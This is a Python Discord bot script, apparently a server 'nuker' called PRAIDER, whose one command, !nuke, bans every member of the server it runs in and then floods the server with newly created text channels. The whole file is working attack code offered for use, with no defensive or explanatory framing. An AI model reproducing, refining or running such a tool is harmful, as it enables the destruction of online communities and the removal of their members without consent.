import discord 
from discord.ext import commands
from colorama import * 
import os
import asyncio
import json 

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

def banner():
    os.system("cls")
    print(Fore.BLUE + """ 
 ________  ________  ________  ___  ________  _______   ________     
|\   __  \|\   __  \|\   __  \|\  \|\   ___ \|\  ___ \ |\   __  \    
\ \  \|\  \ \  \|\  \ \  \|\  \ \  \ \  \_|\ \ \   __/|\ \  \|\  \   
 \ \   ____\ \   _  _\ \   __  \ \  \ \  \ \\ \ \  \_|/_\ \   _  _\  
  \ \  \___|\ \  \\  \\ \  \ \  \ \  \ \  \_\\ \ \  \_|\ \ \  \\  \| 
   \ \__\    \ \__\\ _\\ \__\ \__\ \__\ \_______\ \_______\ \__\\ _\ 
    \|__|     \|__|\|__|\|__|\|__|\|__|\|_______|\|_______|\|__|\|__|
                                                                     
                                                                     
                                                                     
""")





@bot.event 
async def on_ready():
    banner()
    print(f"bot connected to {bot.user}")

def t(val):
    with open("config.json", 'r') as f:
        config = json.load(f)
    return config[val]




@bot.command()
async def nuke(ctx):
    for member in ctx.guild.members:
        if member == bot.user:
            continue
        try:
            await member.ban(reason=t("ban_reason"))
            print(f"success | {member.name}")
            await asyncio.sleep(0.1)
        except discord.Forbidden:
            print(f"missing permissions | {member.name}")
    guild = ctx.guild
    for i in range(t("channel_amount")):
        b = t("chan")
        await guild.create_text_channel(b)
        await asyncio.sleep(0.1)
        
        
        


bot.run(t("token"))
